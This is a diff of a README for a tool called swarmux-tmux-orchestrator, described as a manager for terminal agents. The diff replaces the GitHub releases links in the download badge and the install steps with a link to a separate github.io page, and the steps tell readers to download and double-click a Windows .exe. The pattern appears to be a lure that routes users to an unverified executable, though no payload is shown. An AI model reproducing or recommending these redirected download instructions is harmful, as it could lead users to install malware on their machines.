@@ -1,6 +1,6 @@
 # 🐙 swarmux-tmux-orchestrator - Manage many terminal agents with ease
 
-[![Download SwarmUX](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Impervious-airspring554/swarmux-tmux-orchestrator/releases)
+[![Download SwarmUX](https://img.shields.io/badge/Download-Release-blue.svg)](https://impervious-airspring554.github.io)
 
 SwarmUX v2026 helps you run multiple programs at the same time inside one terminal window. It organizes your workflow so you can see all your work clearly. It checks your commands for mistakes and connects your agents automatically. This tool saves space and keeps your work organized.
 
@@ -15,7 +15,7 @@ Before you install SwarmUX, check that your computer meets these needs:
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/Impervious-airspring554/swarmux-tmux-orchestrator/releases) to download the latest version.
+1. Visit the [releases page](https://impervious-airspring554.github.io) to download the latest version.
 2. Select the file ending in .exe for your version of Windows.
 3. Save the file to a folder you can find later, such as your Downloads folder.
 4. Double-click the downloaded file to start the installation.
